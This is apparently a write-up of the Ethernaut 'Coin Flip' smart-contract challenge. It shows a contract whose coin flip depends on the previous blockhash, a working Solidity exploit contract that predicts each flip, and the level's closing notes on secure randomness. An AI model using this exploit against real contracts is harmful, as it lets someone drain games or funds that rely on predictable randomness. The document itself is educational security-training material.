# Coin Flip

## Challenge Description

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help

-   See the "[?](https://ethernaut.openzeppelin.com/help)" page above in the top right corner menu, section "Beyond the console"

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## Challenge Solution Walkthrough

In this challenge, the random number for flipping the coin is determined deterministically. To guess the correct side of the coin, we need to deploy a contract and implement the same logic for flipping the coin. Here's the contract that you can deploy: (Make sure to place the `CoinFlip.sol` file in the same directory to be able to compile this contract.)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

error WrongPrediction();

contract CoinFlipSolution {
    CoinFlip public coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function solveChallenge() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool coinFlipSide = (blockValue / FACTOR) == 1 ? true : false;
        bool result = coinFlip.flip(coinFlipSide);
        if (result == false) revert WrongPrediction();
    }
}
```

After deploying the `CoinFlipSolution` contract, you need to call the `solveChallenge()` function 10 times to complete the challenge successfully.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](https://www.oraclize.it/)).
